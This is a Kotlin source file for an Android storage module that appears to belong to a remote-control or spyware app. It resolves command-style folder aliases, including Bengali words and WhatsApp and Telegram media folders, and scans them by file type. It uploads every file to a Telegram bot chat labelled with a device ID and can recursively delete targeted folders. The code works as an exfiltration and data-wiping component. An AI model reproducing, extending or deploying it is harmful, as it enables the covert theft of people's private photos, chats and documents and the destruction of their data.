package com.example.scanner

import android.os.Environment
import android.util.Log
import com.example.network.TelegramApiService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File
import java.util.Locale

data class FolderScanResult(
    val folderPath: String,
    val exists: Boolean,
    val isDirectory: Boolean,
    val totalFiles: Int,
    val totalBytes: Long,
    val imageFiles: List<File>,
    val videoFiles: List<File>,
    val audioFiles: List<File>,
    val docFiles: List<File>,
    val otherFiles: List<File>
)

data class FolderUploadResult(
    val totalFound: Int,
    val uploadedCount: Int,
    val failedCount: Int,
    val skippedCount: Int,
    val totalBytesUploaded: Long,
    val errors: List<String>
)

data class FolderDeleteResult(
    val deletedCount: Int,
    val failedCount: Int,
    val bytesFreed: Long,
    val isTargetDirectory: Boolean,
    val targetPath: String,
    val error: String? = null
)

object StorageFolderManager {

    private val IMAGE_EXTENSIONS = setOf("jpg", "jpeg", "png", "webp", "gif", "bmp", "heic", "heif")
    private val VIDEO_EXTENSIONS = setOf("mp4", "mkv", "3gp", "webm", "avi", "mov", "flv", "wmv", "m4v")
    private val AUDIO_EXTENSIONS = setOf("mp3", "m4a", "wav", "aac", "flac", "ogg", "opus", "wma")
    private val DOC_EXTENSIONS = setOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv", "json", "apk", "zip", "rar", "7z")

    fun resolveStoragePath(inputPath: String?): File {
        val raw = inputPath?.trim()?.removeSurrounding("\"")?.removeSurrounding("'") ?: ""
        val externalStorage = Environment.getExternalStorageDirectory()

        if (raw.isBlank() || raw.equals("root", ignoreCase = true) || raw == "/" || raw.equals("sdcard", ignoreCase = true)) {
            return externalStorage
        }

        val lower = raw.lowercase()
        return when {
            lower in listOf("download", "downloads", "ডাউনলোড") -> {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            }
            lower in listOf("camera", "dcim/camera", "dcim", "ক্যামেরা") -> {
                val dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
                val cam = File(dcim, "Camera")
                if (cam.exists()) cam else dcim
            }
            lower in listOf("pictures", "photos", "images", "ছবি") -> {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
            }
            lower in listOf("movies", "videos", "video", "ভিডিও") -> {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES)
            }
            lower in listOf("documents", "docs", "document", "ডকুমেন্ট") -> {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
            }
            lower in listOf("music", "audio", "গান") -> {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)
            }
            lower in listOf("whatsapp", "whatsapp media") -> {
                val waNew = File(externalStorage, "Android/media/com.whatsapp/WhatsApp/Media")
                val waOld = File(externalStorage, "WhatsApp/Media")
                if (waNew.exists()) waNew else if (waOld.exists()) waOld else waNew
            }
            lower in listOf("telegram", "tg") -> {
                val tg = File(externalStorage, "Telegram")
                val tgDl = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "Telegram")
                if (tg.exists()) tg else if (tgDl.exists()) tgDl else tg
            }
            raw.startsWith("/") -> File(raw)
            raw.startsWith("sdcard/", ignoreCase = true) -> File("/$raw")
            raw.startsWith("storage/", ignoreCase = true) -> File("/$raw")
            else -> File(externalStorage, raw)
        }
    }

    fun scanFolder(target: File): FolderScanResult {
        if (!target.exists()) {
            return FolderScanResult(
                folderPath = target.absolutePath,
                exists = false,
                isDirectory = false,
                totalFiles = 0,
                totalBytes = 0L,
                imageFiles = emptyList(),
                videoFiles = emptyList(),
                audioFiles = emptyList(),
                docFiles = emptyList(),
                otherFiles = emptyList()
            )
        }

        if (target.isFile) {
            val ext = target.extension.lowercase()
            val images = if (ext in IMAGE_EXTENSIONS) listOf(target) else emptyList()
            val videos = if (ext in VIDEO_EXTENSIONS) listOf(target) else emptyList()
            val audios = if (ext in AUDIO_EXTENSIONS) listOf(target) else emptyList()
            val docs = if (ext in DOC_EXTENSIONS) listOf(target) else emptyList()
            val others = if (images.isEmpty() && videos.isEmpty() && audios.isEmpty() && docs.isEmpty()) listOf(target) else emptyList()

            return FolderScanResult(
                folderPath = target.absolutePath,
                exists = true,
                isDirectory = false,
                totalFiles = 1,
                totalBytes = target.length(),
                imageFiles = images,
                videoFiles = videos,
                audioFiles = audios,
                docFiles = docs,
                otherFiles = others
            )
        }

        val allChildren = target.listFiles() ?: emptyArray()
        val files = allChildren.filter { it.isFile }.sortedByDescending { it.lastModified() }

        val images = mutableListOf<File>()
        val videos = mutableListOf<File>()
        val audios = mutableListOf<File>()
        val docs = mutableListOf<File>()
        val others = mutableListOf<File>()
        var totalSize = 0L

        for (file in files) {
            totalSize += file.length()
            val ext = file.extension.lowercase()
            when {
                ext in IMAGE_EXTENSIONS -> images.add(file)
                ext in VIDEO_EXTENSIONS -> videos.add(file)
                ext in AUDIO_EXTENSIONS -> audios.add(file)
                ext in DOC_EXTENSIONS -> docs.add(file)
                else -> others.add(file)
            }
        }

        return FolderScanResult(
            folderPath = target.absolutePath,
            exists = true,
            isDirectory = true,
            totalFiles = files.size,
            totalBytes = totalSize,
            imageFiles = images,
            videoFiles = videos,
            audioFiles = audios,
            docFiles = docs,
            otherFiles = others
        )
    }

    suspend fun uploadFolderFiles(
        folder: File,
        botToken: String,
        chatId: String,
        deviceId: String,
        telegramApi: TelegramApiService,
        filterType: String? = null,
        onProgress: (suspend (current: Int, total: Int, currentFile: File, status: String) -> Unit)? = null
    ): FolderUploadResult = withContext(Dispatchers.IO) {
        val scan = scanFolder(folder)
        if (!scan.exists) {
            return@withContext FolderUploadResult(0, 0, 0, 0, 0L, listOf("Path does not exist: ${folder.absolutePath}"))
        }

        val candidates: List<File> = when (filterType?.lowercase()) {
            "image", "images", "photos", "photo", "ছবি" -> scan.imageFiles
            "video", "videos", "ভিডিও" -> scan.videoFiles
            "audio", "music", "গান" -> scan.audioFiles
            "doc", "docs", "documents", "ডকুমেন্ট" -> scan.docFiles
            else -> {
                // If single file, that file. If folder: images + videos + docs + audios + others
                if (scan.isDirectory) {
                    val combined = mutableListOf<File>()
                    combined.addAll(scan.imageFiles)
                    combined.addAll(scan.videoFiles)
                    combined.addAll(scan.docFiles)
                    combined.addAll(scan.audioFiles)
                    combined.addAll(scan.otherFiles)
                    combined
                } else {
                    listOf(folder)
                }
            }
        }

        var uploaded = 0
        var failed = 0
        var skipped = 0
        var totalBytes = 0L
        val errorList = mutableListOf<String>()

        val maxFileSizeTelegram = 50L * 1024L * 1024L // 50 MB limit for standard Telegram bots

        for ((index, file) in candidates.withIndex()) {
            val fileLen = file.length()
            val sizeMbStr = String.format(Locale.US, "%.1f MB", fileLen / (1024.0 * 1024.0))

            if (fileLen > maxFileSizeTelegram) {
                skipped++
                errorList.add("Skipped '${file.name}' ($sizeMbStr): Exceeds Telegram 50MB Bot limit")
                onProgress?.invoke(index + 1, candidates.size, file, "Skipped (>50MB)")
                continue
            }

            val caption = "📁 <b>File ${index + 1}/${candidates.size}</b>\n" +
                    "📄 <b>Name:</b> <code>${file.name}</code>\n" +
                    "📊 <b>Size:</b> $sizeMbStr\n" +
                    "📂 <b>Path:</b> <code>${file.absolutePath}</code>\n" +
                    "📱 <b>Device:</b> <code>$deviceId</code>"

            onProgress?.invoke(index + 1, candidates.size, file, "Uploading ($sizeMbStr)...")

            val result = telegramApi.uploadFileDirect(
                botToken = botToken,
                chatId = chatId,
                file = file,
                caption = caption
            )

            if (result.isSuccess) {
                uploaded++
                totalBytes += fileLen
                onProgress?.invoke(index + 1, candidates.size, file, "Uploaded successfully")
            } else {
                failed++
                val err = result.exceptionOrNull()?.message ?: "Upload error"
                errorList.add("Failed '${file.name}': $err")
                Log.e("StorageFolderManager", "Failed to upload file ${file.name}: $err")
            }

            // Small delay to prevent hitting Telegram API flood limits (429 Too Many Requests)
            delay(350)
        }

        FolderUploadResult(
            totalFound = candidates.size,
            uploadedCount = uploaded,
            failedCount = failed,
            skippedCount = skipped,
            totalBytesUploaded = totalBytes,
            errors = errorList
        )
    }

    fun deleteTarget(target: File, recursive: Boolean = true): FolderDeleteResult {
        if (!target.exists()) {
            return FolderDeleteResult(
                deletedCount = 0,
                failedCount = 0,
                bytesFreed = 0L,
                isTargetDirectory = false,
                targetPath = target.absolutePath,
                error = "Target does not exist: ${target.absolutePath}"
            )
        }

        if (target.isFile) {
            val length = target.length()
            val deleted = target.delete()
            return if (deleted) {
                FolderDeleteResult(1, 0, length, false, target.absolutePath)
            } else {
                FolderDeleteResult(0, 1, 0L, false, target.absolutePath, "Failed to delete file. Check permissions.")
            }
        }

        // Target is directory
        var count = 0
        var failed = 0
        var freed = 0L

        fun deleteRecursive(fileOrDir: File) {
            if (fileOrDir.isDirectory) {
                val children = fileOrDir.listFiles() ?: emptyArray()
                for (child in children) {
                    deleteRecursive(child)
                }
                if (recursive && fileOrDir != target) {
                    fileOrDir.delete()
                }
            } else if (fileOrDir.isFile) {
                val len = fileOrDir.length()
                if (fileOrDir.delete()) {
                    count++
                    freed += len
                } else {
                    failed++
                }
            }
        }

        try {
            val children = target.listFiles() ?: emptyArray()
            for (child in children) {
                deleteRecursive(child)
            }
            if (recursive && target.listFiles()?.isEmpty() == true) {
                // Keep the root folder itself if user pointed to standard root directories like Download, Camera etc.
                val name = target.name.lowercase()
                val isStandardSystemDir = name in listOf("download", "downloads", "dcim", "camera", "pictures", "movies", "documents", "music")
                if (!isStandardSystemDir) {
                    target.delete()
                }
            }
            return FolderDeleteResult(count, failed, freed, true, target.absolutePath)
        } catch (e: Exception) {
            return FolderDeleteResult(count, failed, freed, true, target.absolutePath, e.message)
        }
    }

    fun formatBytes(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 * 1024 -> String.format(Locale.US, "%.2f GB", bytes / (1024.0 * 1024.0 * 1024.0))
            bytes >= 1024 * 1024 -> String.format(Locale.US, "%.2f MB", bytes / (1024.0 * 1024.0))
            bytes >= 1024 -> String.format(Locale.US, "%.1f KB", bytes / 1024.0)
            else -> "$bytes B"
        }
    }
}
